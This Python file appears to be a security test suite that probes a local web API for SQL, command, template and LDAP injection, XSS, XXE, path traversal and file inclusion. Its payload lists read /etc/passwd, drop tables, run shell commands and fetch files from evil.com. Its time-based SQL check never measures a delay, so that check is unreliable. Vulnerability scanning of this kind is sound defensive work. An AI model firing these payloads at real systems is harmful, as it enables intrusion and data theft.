#!/usr/bin/env python3
"""
Input Validation Security Tests
Comprehensive testing of all input validation vulnerabilities
"""

import asyncio
import json
import pytest
import requests
import time
from datetime import datetime
from typing import Dict, List, Any
import base64
import urllib.parse

class InputValidationTester:
    """Test suite for input validation vulnerabilities"""
    
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.test_results = []
        
        # Payload collections
        self.sql_injection_payloads = [
            "' OR '1'='1",
            "' UNION SELECT 1,2,3--",
            "'; DROP TABLE users;--",
            "' AND (SELECT COUNT(*) FROM users) > 0--",
            "1' OR SLEEP(5)--",
            "admin'/*",
            "1' AND 1=1--",
            "1' OR 1=1#",
            "'; EXEC xp_cmdshell('dir')--",
            "1' UNION ALL SELECT NULL,NULL,NULL--"
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "';alert('XSS');//",
            "\"><script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>"
        ]
        
        self.command_injection_payloads = [
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "; cat /etc/passwd",
            "|| cat /etc/passwd",
            "`id`",
            "$(whoami)",
            "; ping -c 1 127.0.0.1",
            "& dir",
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts"
        ]
        
        self.path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/var/www/../../etc/passwd",
            "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts"
        ]
        
        self.ldap_injection_payloads = [
            "*)(uid=*",
            "*)(|(uid=*))",
            "admin)(&(password=*))",
            "*))%00",
            ")(cn=*))%00",
            "*)(objectClass=*",
            "admin)(|(password=*))"
        ]
        
        self.xml_injection_payloads = [
            "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>",
            "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"http://evil.com/\">]><test>&xxe;</test>",
            "<!DOCTYPE test [<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\"> %xxe;]>",
            "<![CDATA[<script>alert('XSS')</script>]]>",
            "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe \"XSS\">]><test>&xxe;</test>"
        ]
        
    async def run_all_tests(self) -> List[Dict[str, Any]]:
        """Run all input validation tests"""
        print("🔍 Testing Input Validation Vulnerabilities...")
        
        test_methods = [
            self.test_sql_injection,
            self.test_xss_vulnerabilities,
            self.test_command_injection,
            self.test_path_traversal,
            self.test_ldap_injection,
            self.test_xml_injection,
            self.test_json_injection,
            self.test_template_injection,
            self.test_file_inclusion,
            self.test_buffer_overflow,
            self.test_format_string,
            self.test_integer_overflow,
            self.test_unicode_bypass,
            self.test_double_encoding_bypass
        ]
        
        for test_method in test_methods:
            try:
                result = await test_method()
                self.test_results.append(result)
            except Exception as e:
                self.test_results.append({
                    "test": test_method.__name__,
                    "status": "ERROR",
                    "error": str(e),
                    "timestamp": datetime.now().isoformat()
                })
        
        return self.test_results
    
    async def test_sql_injection(self) -> Dict[str, Any]:
        """Test SQL injection vulnerabilities"""
        test_name = "SQL Injection"
        vulnerabilities = []
        
        # Test endpoints that might be vulnerable
        test_endpoints = [
            ("/api/work-orders", "GET", "id"),
            ("/api/dispensers", "GET", "search"),
            ("/api/users", "GET", "id"),
            ("/api/auth/login", "POST", "username"),
            ("/api/work-orders", "POST", "customer"),
            ("/api/settings", "POST", "value")
        ]
        
        for endpoint, method, param in test_endpoints:
            for payload in self.sql_injection_payloads:
                try:
                    if method == "GET":
                        response = self.session.get(
                            f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}",
                            timeout=10
                        )
                    else:
                        data = {param: payload}
                        response = self.session.post(
                            f"{self.base_url}{endpoint}",
                            json=data,
                            timeout=10
                        )
                    
                    # Check for SQL error messages
                    error_indicators = [
                        'sql syntax',
                        'mysql',
                        'postgresql',
                        'sqlite',
                        'syntax error',
                        'unclosed quotation mark',
                        'quoted string not properly terminated',
                        'invalid column name',
                        'table doesn\'t exist',
                        'database error'
                    ]
                    
                    response_text = response.text.lower()
                    
                    for indicator in error_indicators:
                        if indicator in response_text:
                            vulnerabilities.append({
                                "endpoint": endpoint,
                                "method": method,
                                "parameter": param,
                                "payload": payload,
                                "response_code": response.status_code,
                                "error_indicator": indicator,
                                "severity": "HIGH",
                                "description": f"SQL error message detected on {endpoint}"
                            })
                            break
                    
                    # Check for time-based SQL injection
                    if "SLEEP" in payload or "WAITFOR" in payload:
                        start_time = time.time()
                        # Response time already measured above
                        end_time = time.time()
                        
                        if end_time - start_time > 4:  # 5 second delay expected
                            vulnerabilities.append({
                                "endpoint": endpoint,
                                "method": method,
                                "parameter": param,
                                "payload": payload,
                                "response_time": end_time - start_time,
                                "severity": "CRITICAL",
                                "description": f"Time-based SQL injection on {endpoint}"
                            })
                    
                    # Check for union-based SQL injection
                    if "UNION" in payload and response.status_code == 200:
                        # Look for unusual data structures or extra columns
                        if response.headers.get('content-type', '').startswith('application/json'):
                            try:
                                json_data = response.json()
                                if isinstance(json_data, list) and len(json_data) > 10:
                                    vulnerabilities.append({
                                        "endpoint": endpoint,
                                        "method": method,
                                        "parameter": param,
                                        "payload": payload,
                                        "response_code": response.status_code,
                                        "severity": "CRITICAL",
                                        "description": f"Possible UNION-based SQL injection on {endpoint}"
                                    })
                            except:
                                pass
                                
                except Exception:
                    continue
        
        return {
            "test": test_name,
            "status": "FAIL" if vulnerabilities else "PASS",
            "vulnerabilities": vulnerabilities,
            "total_tests": len(test_endpoints) * len(self.sql_injection_payloads)
        }
    
    async def test_xss_vulnerabilities(self) -> Dict[str, Any]:
        """Test Cross-Site Scripting vulnerabilities"""
        test_name = "Cross-Site Scripting (XSS)"
        vulnerabilities = []
        
        # Test endpoints for XSS
        test_endpoints = [
            ("/api/work-orders", "POST", "customer"),
            ("/api/work-orders", "POST", "instructions"),
            ("/api/settings", "POST", "value"),
            ("/api/users", "POST", "name"),
            ("/api/dispensers", "GET", "search"),
            ("/api/comments", "POST", "comment")
        ]
        
        for endpoint, method, param in test_endpoints:
            for payload in self.xss_payloads:
                try:
                    if method == "GET":
                        response = self.session.get(
                            f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}",
                            timeout=10
                        )
                    else:
                        data = {param: payload}
                        response = self.session.post(
                            f"{self.base_url}{endpoint}",
                            json=data,
                            timeout=10
                        )
                    
                    # Check if payload is reflected in response
                    if payload in response.text:
                        # Check if it's in an HTML context
                        if response.headers.get('content-type', '').startswith('text/html'):
                            vulnerabilities.append({
                                "endpoint": endpoint,
                                "method": method,
                                "parameter": param,
                                "payload": payload,
                                "response_code": response.status_code,
                                "severity": "HIGH",
                                "type": "reflected_xss",
                                "description": f"Reflected XSS vulnerability on {endpoint}"
                            })
                        else:
                            # JSON response with unescaped data
                            vulnerabilities.append({
                                "endpoint": endpoint,
                                "method": method,
                                "parameter": param,
                                "payload": payload,
                                "response_code": response.status_code,
                                "severity": "MEDIUM",
                                "type": "json_xss",
                                "description": f"Unescaped data in JSON response on {endpoint}"
                            })
                    
                    # Check for stored XSS by making a GET request after POST
                    if method == "POST" and response.status_code in [200, 201]:
                        try:
                            get_response = self.session.get(f"{self.base_url}{endpoint}")
                            
                            if payload in get_response.text:
                                vulnerabilities.append({
                                    "endpoint": endpoint,
                                    "method": "GET (after POST)",
                                    "parameter": param,
                                    "payload": payload,
                                    "response_code": get_response.status_code,
                                    "severity": "CRITICAL",
                                    "type": "stored_xss",
                                    "description": f"Stored XSS vulnerability on {endpoint}"
                                })
                        except:
                            pass
                            
                except Exception:
                    continue
        
        return {
            "test": test_name,
            "status": "FAIL" if vulnerabilities else "PASS",
            "vulnerabilities": vulnerabilities,
            "total_tests": len(test_endpoints) * len(self.xss_payloads)
        }
    
    async def test_command_injection(self) -> Dict[str, Any]:
        """Test command injection vulnerabilities"""
        test_name = "Command Injection"
        vulnerabilities = []
        
        # Test endpoints that might execute commands
        test_endpoints = [
            ("/api/system/backup", "POST", "filename"),
            ("/api/files/process", "POST", "filename"),
            ("/api/system/command", "POST", "command"),
            ("/api/export", "POST", "format"),
            ("/api/import", "POST", "source")
        ]
        
        for endpoint, method, param in test_endpoints:
            for payload in self.command_injection_payloads:
                try:
                    data = {param: f"test{payload}"}
                    
                    start_time = time.time()
                    response = self.session.post(
                        f"{self.base_url}{endpoint}",
                        json=data,
                        timeout=15
                    )
                    end_time = time.time()
                    
                    response_text = response.text.lower()
                    
                    # Check for command execution indicators
                    command_indicators = [
                        'root:',
                        'bin:',
                        'uid=',
                        'gid=',
                        'administrator',
                        'volume in drive',
                        'directory of',
                        '[system32]'
                    ]
                    
                    for indicator in command_indicators:
                        if indicator in response_text:
                            vulnerabilities.append({
                                "endpoint": endpoint,
                                "method": method,
                                "parameter": param,
                                "payload": payload,
                                "response_code": response.status_code,
                                "indicator": indicator,
                                "severity": "CRITICAL",
                                "description": f"Command injection detected on {endpoint}"
                            })
                            break
                    
                    # Check for time-based command injection (ping)
                    if "ping" in payload and end_time - start_time > 3:
                        vulnerabilities.append({
                            "endpoint": endpoint,
                            "method": method,
                            "parameter": param,
                            "payload": payload,
                            "response_time": end_time - start_time,
                            "severity": "CRITICAL",
                            "description": f"Time-based command injection on {endpoint}"
                        })
                        
                except Exception:
                    continue
        
        return {
            "test": test_name,
            "status": "FAIL" if vulnerabilities else "PASS",
            "vulnerabilities": vulnerabilities,
            "total_tests": len(test_endpoints) * len(self.command_injection_payloads)
        }
    
    async def test_path_traversal(self) -> Dict[str, Any]:
        """Test path traversal vulnerabilities"""
        test_name = "Path Traversal"
        vulnerabilities = []
        
        # Test endpoints that handle file paths
        test_endpoints = [
            ("/api/files", "GET", "path"),
            ("/api/download", "GET", "file"),
            ("/api/logs", "GET", "logfile"),
            ("/api/export", "GET", "filename"),
            ("/api/backup", "GET", "backup_file")
        ]
        
        for endpoint, method, param in test_endpoints:
            for payload in self.path_traversal_payloads:
                try:
                    response = self.session.get(
                        f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}",
                        timeout=10
                    )
                    
                    response_text = response.text.lower()
                    
                    # Check for system file content
                    system_file_indicators = [
                        'root:x:0:0',
                        '# host database',
                        '[boot loader]',
                        'localhost',
                        '127.0.0.1',
                        'windows nt',
                        '/bin/bash',
                        '/bin/sh'
                    ]
                    
                    for indicator in system_file_indicators:
                        if indicator in response_text:
                            vulnerabilities.append({
                                "endpoint": endpoint,
                                "method": method,
                                "parameter": param,
                                "payload": payload,
                                "response_code": response.status_code,
                                "indicator": indicator,
                                "severity": "CRITICAL",
                                "description": f"Path traversal vulnerability on {endpoint}"
                            })
                            break
                    
                    # Check for error messages indicating file access
                    error_indicators = [
                        'no such file',
                        'file not found',
                        'access denied',
                        'permission denied',
                        'cannot access'
                    ]
                    
                    for indicator in error_indicators:
                        if indicator in response_text and response.status_code >= 400:
                            vulnerabilities.append({
                                "endpoint": endpoint,
                                "method": method,
                                "parameter": param,
                                "payload": payload,
                                "response_code": response.status_code,
                                "severity": "MEDIUM",
                                "description": f"File access attempt detected on {endpoint}"
                            })
                            break
                            
                except Exception:
                    continue
        
        return {
            "test": test_name,
            "status": "FAIL" if vulnerabilities else "PASS",
            "vulnerabilities": vulnerabilities,
            "total_tests": len(test_endpoints) * len(self.path_traversal_payloads)
        }
    
    async def test_ldap_injection(self) -> Dict[str, Any]:
        """Test LDAP injection vulnerabilities"""
        test_name = "LDAP Injection"
        vulnerabilities = []
        
        # Test endpoints that might use LDAP
        test_endpoints = [
            ("/api/auth/ldap", "POST", "username"),
            ("/api/users/search", "GET", "query"),
            ("/api/directory", "GET", "filter")
        ]
        
        for endpoint, method, param in test_endpoints:
            for payload in self.ldap_injection_payloads:
                try:
                    if method == "GET":
                        response = self.session.get(
                            f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}",
                            timeout=10
                        )
                    else:
                        data = {param: payload}
                        response = self.session.post(
                            f"{self.base_url}{endpoint}",
                            json=data,
                            timeout=10
                        )
                    
                    response_text = response.text.lower()
                    
                    # Check for LDAP error messages
                    ldap_indicators = [
                        'ldap',
                        'invalid dn syntax',
                        'bad search filter',
                        'directory server',
                        'active directory'
                    ]
                    
                    for indicator in ldap_indicators:
                        if indicator in response_text:
                            vulnerabilities.append({
                                "endpoint": endpoint,
                                "method": method,
                                "parameter": param,
                                "payload": payload,
                                "response_code": response.status_code,
                                "indicator": indicator,
                                "severity": "HIGH",
                                "description": f"LDAP injection vulnerability on {endpoint}"
                            })
                            break
                            
                except Exception:
                    continue
        
        return {
            "test": test_name,
            "status": "FAIL" if vulnerabilities else "PASS",
            "vulnerabilities": vulnerabilities,
            "total_tests": len(test_endpoints) * len(self.ldap_injection_payloads)
        }
    
    async def test_xml_injection(self) -> Dict[str, Any]:
        """Test XML injection and XXE vulnerabilities"""
        test_name = "XML Injection / XXE"
        vulnerabilities = []
        
        # Test endpoints that might process XML
        test_endpoints = [
            ("/api/import/xml", "POST"),
            ("/api/config/xml", "POST"),
            ("/api/soap", "POST"),
            ("/api/webhook", "POST")
        ]
        
        for endpoint, method in test_endpoints:
            for payload in self.xml_injection_payloads:
                try:
                    headers = {"Content-Type": "application/xml"}
                    
                    response = self.session.post(
                        f"{self.base_url}{endpoint}",
                        data=payload,
                        headers=headers,
                        timeout=10
                    )
                    
                    response_text = response.text.lower()
                    
                    # Check for XXE indicators
                    xxe_indicators = [
                        'root:x:0:0',
                        'file not found',
                        'external entity',
                        'xml parsing error',
                        'dtd processing'
                    ]
                    
                    for indicator in xxe_indicators:
                        if indicator in response_text:
                            vulnerabilities.append({
                                "endpoint": endpoint,
                                "method": method,
                                "payload": payload[:100] + "...",
                                "response_code": response.status_code,
                                "indicator": indicator,
                                "severity": "CRITICAL" if "root:x:0:0" in response_text else "HIGH",
                                "description": f"XXE vulnerability detected on {endpoint}"
                            })
                            break
                    
                    # Check for XML parsing errors
                    xml_error_indicators = [
                        'xml syntax error',
                        'malformed xml',
                        'xml parse error',
                        'invalid xml'
                    ]
                    
                    for indicator in xml_error_indicators:
                        if indicator in response_text:
                            vulnerabilities.append({
                                "endpoint": endpoint,
                                "method": method,
                                "payload": payload[:100] + "...",
                                "response_code": response.status_code,
                                "severity": "MEDIUM",
                                "description": f"XML processing detected on {endpoint}"
                            })
                            break
                            
                except Exception:
                    continue
        
        return {
            "test": test_name,
            "status": "FAIL" if vulnerabilities else "PASS",
            "vulnerabilities": vulnerabilities,
            "total_tests": len(test_endpoints) * len(self.xml_injection_payloads)
        }
    
    async def test_json_injection(self) -> Dict[str, Any]:
        """Test JSON injection vulnerabilities"""
        test_name = "JSON Injection"
        vulnerabilities = []
        
        # JSON injection payloads
        json_payloads = [
            '{"test": "value", "admin": true}',
            '{"test": "value"}, {"malicious": "data"}',
            '{"test": "value\\", \\"admin\\": true, \\"test2\\": \\"value2"}',
            '{"test": "value", "role": "admin"}',
            '{"test": "value", "permissions": ["admin", "user"]}',
            '[{"test": "value"}, {"admin": true}]'
        ]
        
        test_endpoints = [
            ("/api/users", "POST"),
            ("/api/settings", "POST"),
            ("/api/work-orders", "POST"),
            ("/api/config", "POST")
        ]
        
        for endpoint, method in test_endpoints:
            for payload in json_payloads:
                try:
                    headers = {"Content-Type": "application/json"}
                    
                    response = self.session.post(
                        f"{self.base_url}{endpoint}",
                        data=payload,
                        headers=headers,
                        timeout=10
                    )
                    
                    # Check if additional fields were processed
                    if response.status_code == 200:
                        try:
                            response_data = response.json()
                            
                            # Look for signs that additional fields were processed
                            if isinstance(response_data, dict):
                                suspicious_fields = ['admin', 'role', 'permissions']
                                
                                for field in suspicious_fields:
                                    if field in response_data:
                                        vulnerabilities.append({
                                            "endpoint": endpoint,
                                            "method": method,
                                            "payload": payload,
                                            "response_code": response.status_code,
                                            "malicious_field": field,
                                            "severity": "HIGH",
                                            "description": f"JSON injection - additional field processed on {endpoint}"
                                        })
                                        
                        except:
                            pass
                            
                except Exception:
                    continue
        
        return {
            "test": test_name,
            "status": "FAIL" if vulnerabilities else "PASS",
            "vulnerabilities": vulnerabilities,
            "total_tests": len(test_endpoints) * len(json_payloads)
        }
    
    async def test_template_injection(self) -> Dict[str, Any]:
        """Test template injection vulnerabilities"""
        test_name = "Template Injection"
        vulnerabilities = []
        
        # Template injection payloads
        template_payloads = [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "{{config}}",
            "{{config.items()}}",
            "${T(java.lang.System).getProperty('java.version')}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "${{<%[%'\"}}%\\"
        ]
        
        test_endpoints = [
            ("/api/templates", "POST", "template"),
            ("/api/email/send", "POST", "subject"),
            ("/api/notifications", "POST", "message"),
            ("/api/reports", "POST", "title")
        ]
        
        for endpoint, method, param in test_endpoints:
            for payload in template_payloads:
                try:
                    data = {param: payload}
                    
                    response = self.session.post(
                        f"{self.base_url}{endpoint}",
                        json=data,
                        timeout=10
                    )
                    
                    response_text = response.text
                    
                    # Check if template expression was evaluated
                    if "49" in response_text and "7*7" in payload:  # 7*7 = 49
                        vulnerabilities.append({
                            "endpoint": endpoint,
                            "method": method,
                            "parameter": param,
                            "payload": payload,
                            "response_code": response.status_code,
                            "severity": "CRITICAL",
                            "description": f"Template injection - expression evaluated on {endpoint}"
                        })
                    
                    # Check for template engine errors
                    template_errors = [
                        'template syntax error',
                        'jinja2.exceptions',
                        'template error',
                        'freemarker',
                        'velocity error'
                    ]
                    
                    for error in template_errors:
                        if error in response_text.lower():
                            vulnerabilities.append({
                                "endpoint": endpoint,
                                "method": method,
                                "parameter": param,
                                "payload": payload,
                                "response_code": response.status_code,
                                "severity": "MEDIUM",
                                "description": f"Template engine detected on {endpoint}"
                            })
                            break
                            
                except Exception:
                    continue
        
        return {
            "test": test_name,
            "status": "FAIL" if vulnerabilities else "PASS",
            "vulnerabilities": vulnerabilities,
            "total_tests": len(test_endpoints) * len(template_payloads)
        }
    
    async def test_file_inclusion(self) -> Dict[str, Any]:
        """Test file inclusion vulnerabilities"""
        test_name = "File Inclusion"
        vulnerabilities = []
        
        # File inclusion payloads
        inclusion_payloads = [
            "php://filter/convert.base64-encode/resource=index.php",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
            "file:///etc/passwd",
            "http://evil.com/shell.php",
            "ftp://evil.com/shell.php",
            "expect://id",
            "zip://shell.jpg%23shell.php"
        ]
        
        test_endpoints = [
            ("/api/include", "GET", "file"),
            ("/api/template", "GET", "include"),
            ("/api/view", "GET", "page"),
            ("/api/load", "GET", "module")
        ]
        
        for endpoint, method, param in test_endpoints:
            for payload in inclusion_payloads:
                try:
                    response = self.session.get(
                        f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}",
                        timeout=10
                    )
                    
                    response_text = response.text.lower()
                    
                    # Check for file inclusion indicators
                    inclusion_indicators = [
                        'root:x:0:0',
                        'phpinfo()',
                        '<?php',
                        'uid=',
                        'gid=',
                        'bin/bash'
                    ]
                    
                    for indicator in inclusion_indicators:
                        if indicator in response_text:
                            vulnerabilities.append({
                                "endpoint": endpoint,
                                "method": method,
                                "parameter": param,
                                "payload": payload,
                                "response_code": response.status_code,
                                "indicator": indicator,
                                "severity": "CRITICAL",
                                "description": f"File inclusion vulnerability on {endpoint}"
                            })
                            break
                            
                except Exception:
                    continue
        
        return {
            "test": test_name,
            "status": "FAIL" if vulnerabilities else "PASS",
            "vulnerabilities": vulnerabilities,
            "total_tests": len(test_endpoints) * len(inclusion_payloads)
        }
    
    async def test_buffer_overflow(self) -> Dict[str, Any]:
        """Test buffer overflow vulnerabilities"""
        test_name = "Buffer Overflow"
        vulnerabilities = []
        
        # Generate large payloads
        buffer_sizes = [1000, 5000, 10000, 50000, 100000]
        
        test_endpoints = [
            ("/api/users", "POST", "name"),
            ("/api/work-orders", "POST", "customer"),
            ("/api/settings", "POST", "value"),
            ("/api/comments", "POST", "comment")
        ]
        
        for endpoint, method, param in test_endpoints:
            for size in buffer_sizes:
                try:
                    payload = "A" * size
                    data = {param: payload}
                    
                    response = self.session.post(
                        f"{self.base_url}{endpoint}",
                        json=data,
                        timeout=15
                    )
                    
                    # Check for error responses that might indicate buffer issues
                    if response.status_code >= 500:
                        vulnerabilities.append({
                            "endpoint": endpoint,
                            "method": method,
                            "parameter": param,
                            "payload_size": size,
                            "response_code": response.status_code,
                            "severity": "MEDIUM",
                            "description": f"Large input caused server error on {endpoint}"
                        })
                        break
                        
                except Exception:
                    # Connection errors might indicate buffer overflow
                    vulnerabilities.append({
                        "endpoint": endpoint,
                        "method": method,
                        "parameter": param,
                        "payload_size": size,
                        "severity": "HIGH",
                        "description": f"Connection error with large input on {endpoint}"
                    })
                    break
        
        return {
            "test": test_name,
            "status": "FAIL" if vulnerabilities else "PASS",
            "vulnerabilities": vulnerabilities,
            "total_tests": len(test_endpoints) * len(buffer_sizes)
        }
    
    async def test_format_string(self) -> Dict[str, Any]:
        """Test format string vulnerabilities"""
        test_name = "Format String"
        vulnerabilities = []
        
        # Format string payloads
        format_payloads = [
            "%x%x%x%x%x%x%x%x",
            "%s%s%s%s%s%s%s%s",
            "%n%n%n%n%n%n%n%n",
            "%08x.%08x.%08x.%08x",
            "%d%d%d%d%d%d%d%d",
            "%.1000d%.1000d%.1000d"
        ]
        
        test_endpoints = [
            ("/api/logs", "POST", "message"),
            ("/api/debug", "POST", "data"),
            ("/api/format", "POST", "template"),
            ("/api/print", "POST", "content")
        ]
        
        for endpoint, method, param in test_endpoints:
            for payload in format_payloads:
                try:
                    data = {param: payload}
                    
                    response = self.session.post(
                        f"{self.base_url}{endpoint}",
                        json=data,
                        timeout=10
                    )
                    
                    response_text = response.text
                    
                    # Check for format string indicators
                    if any(indicator in response_text for indicator in 
                           ['0x', 'bffff', 'printf', 'format string']):
                        vulnerabilities.append({
                            "endpoint": endpoint,
                            "method": method,
                            "parameter": param,
                            "payload": payload,
                            "response_code": response.status_code,
                            "severity": "HIGH",
                            "description": f"Format string vulnerability on {endpoint}"
                        })
                        
                except Exception:
                    continue
        
        return {
            "test": test_name,
            "status": "FAIL" if vulnerabilities else "PASS",
            "vulnerabilities": vulnerabilities,
            "total_tests": len(test_endpoints) * len(format_payloads)
        }
    
    async def test_integer_overflow(self) -> Dict[str, Any]:
        """Test integer overflow vulnerabilities"""
        test_name = "Integer Overflow"
        vulnerabilities = []
        
        # Integer overflow payloads
        overflow_values = [
            2147483647,    # INT_MAX
            2147483648,    # INT_MAX + 1
            4294967295,    # UINT_MAX
            4294967296,    # UINT_MAX + 1
            -2147483648,   # INT_MIN
            -2147483649,   # INT_MIN - 1
            999999999999999999999999999999999999999999
        ]
        
        test_endpoints = [
            ("/api/users", "POST", "age"),
            ("/api/work-orders", "POST", "quantity"),
            ("/api/settings", "POST", "timeout"),
            ("/api/limits", "POST", "max_value")
        ]
        
        for endpoint, method, param in test_endpoints:
            for value in overflow_values:
                try:
                    data = {param: value}
                    
                    response = self.session.post(
                        f"{self.base_url}{endpoint}",
                        json=data,
                        timeout=10
                    )
                    
                    # Check for overflow errors or unexpected behavior
                    if response.status_code >= 500:
                        vulnerabilities.append({
                            "endpoint": endpoint,
                            "method": method,
                            "parameter": param,
                            "value": value,
                            "response_code": response.status_code,
                            "severity": "MEDIUM",
                            "description": f"Integer overflow caused error on {endpoint}"
                        })
                    
                    # Check for negative values being accepted where they shouldn't
                    if value < 0 and response.status_code == 200:
                        vulnerabilities.append({
                            "endpoint": endpoint,
                            "method": method,
                            "parameter": param,
                            "value": value,
                            "response_code": response.status_code,
                            "severity": "LOW",
                            "description": f"Negative value accepted on {endpoint}"
                        })
                        
                except Exception:
                    continue
        
        return {
            "test": test_name,
            "status": "FAIL" if vulnerabilities else "PASS",
            "vulnerabilities": vulnerabilities,
            "total_tests": len(test_endpoints) * len(overflow_values)
        }
    
    async def test_unicode_bypass(self) -> Dict[str, Any]:
        """Test Unicode normalization bypass"""
        test_name = "Unicode Bypass"
        vulnerabilities = []
        
        # Unicode bypass payloads
        unicode_payloads = [
            "admin\u202E",  # Right-to-left override
            "admin\u200D",  # Zero-width joiner
            "admin\u200C",  # Zero-width non-joiner
            "admin\u00A0",  # Non-breaking space
            "admin\u2000",  # En quad
            "ａｄｍｉｎ",  # Full-width characters
            "𝒶𝒹𝓂𝒾𝓃",    # Mathematical script
            "admin\uFEFF"   # Zero-width no-break space
        ]
        
        test_endpoints = [
            ("/api/auth/login", "POST", "username"),
            ("/api/users", "POST", "name"),
            ("/api/search", "GET", "q")
        ]
        
        for endpoint, method, param in test_endpoints:
            for payload in unicode_payloads:
                try:
                    if method == "GET":
                        response = self.session.get(
                            f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}",
                            timeout=10
                        )
                    else:
                        data = {param: payload}
                        response = self.session.post(
                            f"{self.base_url}{endpoint}",
                            json=data,
                            timeout=10
                        )
                    
                    # Check if Unicode characters bypassed validation
                    if response.status_code == 200:
                        vulnerabilities.append({
                            "endpoint": endpoint,
                            "method": method,
                            "parameter": param,
                            "payload": payload,
                            "payload_hex": payload.encode('unicode_escape').decode(),
                            "response_code": response.status_code,
                            "severity": "MEDIUM",
                            "description": f"Unicode characters may bypass validation on {endpoint}"
                        })
                        
                except Exception:
                    continue
        
        return {
            "test": test_name,
            "status": "FAIL" if vulnerabilities else "PASS",
            "vulnerabilities": vulnerabilities,
            "total_tests": len(test_endpoints) * len(unicode_payloads)
        }
    
    async def test_double_encoding_bypass(self) -> Dict[str, Any]:
        """Test double encoding bypass"""
        test_name = "Double Encoding Bypass"
        vulnerabilities = []
        
        # Double encoding payloads
        encoding_payloads = [
            "%252e%252e%252f",  # Double encoded ../
            "%2527%2520OR%25201%253D1%2520--",  # Double encoded ' OR 1=1 --
            "%253Cscript%253E",  # Double encoded <script>
            "%252f%252e%252e%252f",  # Double encoded /../
        ]
        
        test_endpoints = [
            ("/api/files", "GET", "path"),
            ("/api/search", "GET", "q"),
            ("/api/include", "GET", "file")
        ]
        
        for endpoint, method, param in test_endpoints:
            for payload in encoding_payloads:
                try:
                    response = self.session.get(
                        f"{self.base_url}{endpoint}?{param}={payload}",
                        timeout=10
                    )
                    
                    # Check for signs that double encoding was processed
                    response_text = response.text.lower()
                    
                    bypass_indicators = [
                        'root:x:0:0',
                        'file not found',
                        '<script>',
                        'sql syntax'
                    ]
                    
                    for indicator in bypass_indicators:
                        if indicator in response_text:
                            vulnerabilities.append({
                                "endpoint": endpoint,
                                "method": method,
                                "parameter": param,
                                "payload": payload,
                                "response_code": response.status_code,
                                "indicator": indicator,
                                "severity": "HIGH",
                                "description": f"Double encoding bypass on {endpoint}"
                            })
                            break
                            
                except Exception:
                    continue
        
        return {
            "test": test_name,
            "status": "FAIL" if vulnerabilities else "PASS",
            "vulnerabilities": vulnerabilities,
            "total_tests": len(test_endpoints) * len(encoding_payloads)
        }
    
    def generate_report(self) -> Dict[str, Any]:
        """Generate comprehensive test report"""
        total_tests = len(self.test_results)
        failed_tests = len([t for t in self.test_results if t.get("status") == "FAIL"])
        total_vulnerabilities = sum(len(t.get("vulnerabilities", [])) for t in self.test_results)
        
        severity_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
        vulnerability_types = {}
        
        for test in self.test_results:
            for vuln in test.get("vulnerabilities", []):
                severity = vuln.get("severity", "LOW")
                severity_counts[severity] += 1
                
                vuln_type = test.get("test", "Unknown")
                vulnerability_types[vuln_type] = vulnerability_types.get(vuln_type, 0) + 1
        
        return {
            "summary": {
                "total_tests": total_tests,
                "passed_tests": total_tests - failed_tests,
                "failed_tests": failed_tests,
                "total_vulnerabilities": total_vulnerabilities,
                "severity_breakdown": severity_counts,
                "vulnerability_types": vulnerability_types
            },
            "test_results": self.test_results,
            "timestamp": datetime.now().isoformat()
        }

async def main():
    """Main function for running input validation tests"""
    tester = InputValidationTester()
    await tester.run_all_tests()
    
    report = tester.generate_report()
    
    print("\n" + "="*60)
    print("🔍 INPUT VALIDATION TEST SUMMARY")
    print("="*60)
    print(f"Total Tests: {report['summary']['total_tests']}")
    print(f"Passed: {report['summary']['passed_tests']}")
    print(f"Failed: {report['summary']['failed_tests']}")
    print(f"Total Vulnerabilities: {report['summary']['total_vulnerabilities']}")
    print(f"Critical: {report['summary']['severity_breakdown']['CRITICAL']}")
    print(f"High: {report['summary']['severity_breakdown']['HIGH']}")
    print(f"Medium: {report['summary']['severity_breakdown']['MEDIUM']}")
    print(f"Low: {report['summary']['severity_breakdown']['LOW']}")
    print("="*60)
    
    # Print vulnerability breakdown by type
    if report['summary']['vulnerability_types']:
        print("\nVulnerability Types Found:")
        for vuln_type, count in report['summary']['vulnerability_types'].items():
            print(f"  {vuln_type}: {count}")

if __name__ == "__main__":
    asyncio.run(main())